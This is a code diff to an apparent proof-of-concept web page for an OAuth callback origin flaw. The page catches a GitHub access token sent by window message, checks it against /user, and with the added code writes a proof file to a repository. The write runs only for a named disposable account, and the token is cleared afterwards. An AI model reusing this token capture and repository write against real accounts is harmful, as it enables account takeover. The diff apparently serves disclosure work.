@@ -4,6 +4,7 @@ const authInput = document.getElementById("auth-url");
 const startButton = document.getElementById("start");
 const downloadButton = document.getElementById("download");
 const resultBox = document.getElementById("result");
+const proofRepo = "kevlardel12/oauth-origin-check-2026";
 
 let popup = null;
 let expectedOrigin = null;
@@ -37,7 +38,7 @@ startButton.addEventListener("click", () => {
   downloadButton.disabled = true;
   expectedOrigin = authUrl.origin;
   authorizationEndpoint = `${authUrl.origin}${authUrl.pathname}`;
-  show("Opening the real authorization endpoint. Complete consent only with a disposable account.");
+  show("Opening the real authorization endpoint. Complete consent only with the disposable kevlardel12 account. The probe will write one harmless public proof file.");
   popup = window.open(authUrl.href, "controlled-oauth-origin-check", "width=680,height=760");
   if (!popup) {
     show("The popup was blocked. Allow popups for this page and try again.");
@@ -82,10 +83,13 @@ window.addEventListener("message", async (event) => {
   }
 
   const observedAt = new Date().toISOString();
-  show(`Token received from the live callback at ${event.origin}. Checking it once with GitHub /user...`);
+  show(`Token received from the live callback at ${event.origin}. Checking it with GitHub /user, then writing one proof file to the disposable repository...`);
 
   let githubStatus = null;
   let githubLogin = null;
+  let githubWriteStatus = null;
+  let proofFileUrl = null;
+  let proofCommitSha = null;
   try {
     const response = await fetch("https://api.github.com/user", {
       method: "GET",
@@ -96,13 +100,40 @@ window.addEventListener("message", async (event) => {
         "Accept": "application/vnd.github+json"
       }
     });
-    token = "";
     githubStatus = response.status;
     if (response.ok) {
       const user = await response.json();
       githubLogin = typeof user.login === "string" ? user.login : null;
     }
+
+    if (githubStatus === 200 && githubLogin === "kevlardel12") {
+      const proofPath = `oauth-write-proof-${observedAt.replace(/[^0-9]/g, "")}.txt`;
+      const proofText = `Controlled OAuth repository write proof\nObserved at: ${observedAt}\nRepository: ${proofRepo}\nNo token is included.\n`;
+      const writeResponse = await fetch(`https://api.github.com/repos/${proofRepo}/contents/${proofPath}`, {
+        method: "PUT",
+        mode: "cors",
+        cache: "no-store",
+        headers: {
+          "Authorization": `Bearer ${token}`,
+          "Accept": "application/vnd.github+json",
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          message: "Controlled OAuth write proof in disposable repository",
+          content: btoa(proofText),
+          branch: "main"
+        })
+      });
+      githubWriteStatus = writeResponse.status;
+      if (writeResponse.status === 201) {
+        const writeResult = await writeResponse.json();
+        proofFileUrl = typeof writeResult.content?.html_url === "string" ? writeResult.content.html_url : null;
+        proofCommitSha = typeof writeResult.commit?.sha === "string" ? writeResult.commit.sha : null;
+      }
+    }
   } catch (_) {
+    // Only sanitized status is retained below.
+  } finally {
     token = "";
   }
 
@@ -116,13 +147,17 @@ window.addEventListener("message", async (event) => {
     github_api_endpoint: "https://api.github.com/user",
     github_http_status: githubStatus,
     github_login: githubLogin,
+    proof_repository: proofRepo,
+    github_write_http_status: githubWriteStatus,
+    proof_file_url: proofFileUrl,
+    proof_commit_sha: proofCommitSha,
     token_in_evidence: false
   };
 
-  if (githubStatus === 200 && githubLogin) {
-    show(`CONFIRMED IN THIS RUN\nOpener: ${evidence.opener_origin}\nCallback: ${evidence.callback_origin}\nToken received: yes\nGitHub /user: HTTP ${githubStatus}\nDisposable GitHub account: ${githubLogin}\nToken included in result file: no`);
+  if (githubStatus === 200 && githubLogin === "kevlardel12" && githubWriteStatus === 201 && proofFileUrl) {
+    show(`LIVE REPOSITORY WRITE CONFIRMED\nOpener: ${evidence.opener_origin}\nCallback: ${evidence.callback_origin}\nToken received: yes\nGitHub /user: HTTP ${githubStatus} (${githubLogin})\nGitHub repository write: HTTP ${githubWriteStatus}\nProof file: ${proofFileUrl}\nToken included in result file: no`);
   } else {
-    show(`NOT FULLY CONFIRMED IN THIS RUN\nOpener: ${evidence.opener_origin}\nCallback: ${evidence.callback_origin}\nToken received: yes\nGitHub /user: ${githubStatus ?? "request failed"}\nNo successful GitHub identity check was recorded.`);
+    show(`REPOSITORY WRITE NOT CONFIRMED IN THIS RUN\nOpener: ${evidence.opener_origin}\nCallback: ${evidence.callback_origin}\nToken received: yes\nGitHub /user: ${githubStatus ?? "request failed"} (${githubLogin ?? "unknown account"})\nGitHub repository write: ${githubWriteStatus ?? "not attempted or request failed"}\nNo successful repository write was recorded.`);
   }
 
   downloadButton.disabled = false;
